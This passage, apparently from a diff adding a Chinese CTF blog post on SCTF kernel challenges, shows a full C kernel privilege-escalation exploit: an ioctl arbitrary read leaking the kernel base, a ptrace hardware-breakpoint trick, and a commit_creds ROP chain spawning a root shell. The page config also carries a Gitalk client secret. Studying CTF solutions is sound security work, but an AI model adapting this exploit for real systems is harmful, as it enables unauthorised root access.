+</span></span><span class="line"><span class="cl">    <span class="cm">/* Set DR7: bit 0 enables DR0 breakpoint. Bit 8 ensures the processor stops
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * on the instruction which causes the exception. bits 16,17 means we stop
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * on data read or write. */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">dr_7</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">17</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKEUSER</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nf">DR_OFFSET</span><span class="p">(</span><span class="mi">7</span><span class="p">),</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">dr_7</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;create hbp ptrace dr7: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="kt">long</span> <span class="nf">arb_read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="kt">long</span> <span class="n">ret_content</span> <span class="o">=</span> <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x5555</span><span class="p">,</span><span class="n">addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret_content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">do_init</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;do init ...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">saveStatus</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">vuln_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/seven&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// vuln_fd1 = open(&#34;/dev/seven&#34;, O_RDONLY);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">vuln_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;open vuln_fd: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// global mmap
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="n">GLOBAL_MMAP_ADDR</span><span class="p">,</span> <span class="n">GLOBAL_MMAP_LENGTH</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                   <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;mmap: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">pipe</span><span class="p">(</span><span class="n">sync_pipe</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;pipe: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">pipe</span><span class="p">(</span><span class="n">sync_pipe</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;pipe: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="o">*</span><span class="n">physmap_spray_arr</span><span class="p">[</span><span class="mi">16000</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">page_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">try_hit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span>     <span class="n">dev_fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span>  <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">getRootShell</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>   
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[32m</span><span class="se">\033</span><span class="s">[1m[+] Backing from the kernelspace.</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">getuid</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[31m</span><span class="se">\033</span><span class="s">[1m[x] Failed to get the root!</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[32m</span><span class="se">\033</span><span class="s">[1m[+] Successful to get the root. Execve root shell now...</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="c1">// to exit the process normally instead of segmentation fault
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">shell_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">getRootShell</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fn_child</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">kernel_base</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">name_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">GLOBAL_MMAP_ADDR</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">GLOBAL_MMAP_ADDR</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">GLOBAL_MMAP_LENGTH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="c1">//可以被调试
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;ptrace PTRACE_TRACEME: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">raise</span><span class="p">(</span><span class="n">SIGSTOP</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0x0bb5b0</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">init_cred</span> <span class="o">=</span> <span class="mh">0x1a4cbf8</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x002c9d</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="mh">0x04e368</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rsp_ret</span> <span class="o">=</span> <span class="mh">0x2af92f</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">swapgs_restore_regs_and_return_to_usermode</span> <span class="o">=</span> <span class="mh">0x1000f01</span><span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">add_rsp_0x18_pop_rbx_pop_rbp_ret</span> <span class="o">=</span> <span class="mh">0x18be788</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="mh">0x00038d</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;init_cred: %llx&#34;</span><span class="p">,</span><span class="n">init_cred</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;init_cred: %llx&#34;</span><span class="p">,</span><span class="n">pop_rdi_ret</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, pop_rdi_ret;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r14, init_cred;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r13, commit_creds;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r12, swapgs_restore_regs_and_return_to_usermode;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rbp, 0;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rbx, 0;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r11, shell_addr;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r10, user_cs;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r9, user_rflags;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r8, user_sp;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rax,user_ss;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rcx,0;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rdx, 0;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rsi, 0;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rdi, 0x12340000;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov rsi, [rdi];&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//mov rsi,[rdi] 触发硬件断点
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// uname(name_buf);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// *name_buf = 1;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">do_init</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="nf">arb_read</span><span class="p">(</span><span class="n">vuln_fd</span><span class="p">,</span><span class="mh">0xfffffe0000002f50</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">-</span> <span class="mh">0x1000b49</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;%llx&#34;</span><span class="p">,</span><span class="n">kernel_base</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">child</span> <span class="o">=</span> <span class="nf">fork</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fn_child</span><span class="p">(</span><span class="n">kernel_base</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">child</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;fork error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">waitpid</span><span class="p">(</span><span class="n">child</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">__WALL</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span><span class="c1">//等待子进程触发断点或者产生异常此时程序会停在raise(stop)处
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;waitpid&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;create hw_breakpoint for child&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">create_hbp</span><span class="p">(</span><span class="n">child</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">GLOBAL_MMAP_ADDR</span><span class="p">);</span><span class="c1">//设置硬件断点
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span><span class="n">child</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span><span class="c1">//使子程序可以继续运行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;ptrace %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">waitpid</span><span class="p">(</span><span class="n">child</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">__WALL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span><span class="c1">//等待子进程，此时应该停在触发硬件断点的地方
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;waitpid&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span><span class="n">child</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span><span class="c1">//继续
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;ptrace %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">waitpid</span><span class="p">(</span><span class="n">child</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">__WALL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span><span class="c1">//等待子进程，此时应该停在退出的地方
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;waitpid&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span><span class="n">child</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;ptrace %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">vuln_fd</span><span class="p">,</span><span class="mh">0x6666</span><span class="p">,</span><span class="mh">0xfffffe0000010f58</span><span class="p">);</span><span class="c1">//控制rsp到0xfffffe0000010f58
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622062034083.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622062034083.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622062034083.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622062034083.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622062034083.png"
+        title="image-20230622062034083" /></p>
+<h1 id="sycrpg">sycrpg</h1>
+<p>TODO</p>
+<h1 id="moonspray">MoonSpray</h1>
+<p>TODO</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-06-22</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://cnitlrt.github.io/sctf%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" data-title="Sctf内核题目复现" data-hashtags="kernel"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://cnitlrt.github.io/sctf%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" data-hashtag="kernel"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://cnitlrt.github.io/sctf%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" data-title="Sctf内核题目复现"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://cnitlrt.github.io/sctf%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" data-title="Sctf内核题目复现"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://cnitlrt.github.io/sctf%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" data-title="Sctf内核题目复现"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/kernel/">kernel</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/" class="prev" rel="prev" title="安卓逆向学习"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>安卓逆向学习</a>
+            <a href="/qwbswap%E5%A4%8D%E7%8E%B0/" class="next" rel="next" title="qwb-2021-qwbswap复现">qwb-2021-qwbswap复现<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="gitalk" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">cnitlrt</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"gitalk":{"admin":["cnitlrt"],"clientID":"2a776c3dc5f0100884f8","clientSecret":"148adb4f82e540cd5b1e77e16152f6844be4b240","id":"2023-06-22T04:18:31+08:00","owner":"cnitlrt","repo":"cnitlrt.github.io","title":"Sctf内核题目复现"}},"data":{"id-1":"cnitlrtの博客","id-2":"cnitlrtの博客"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
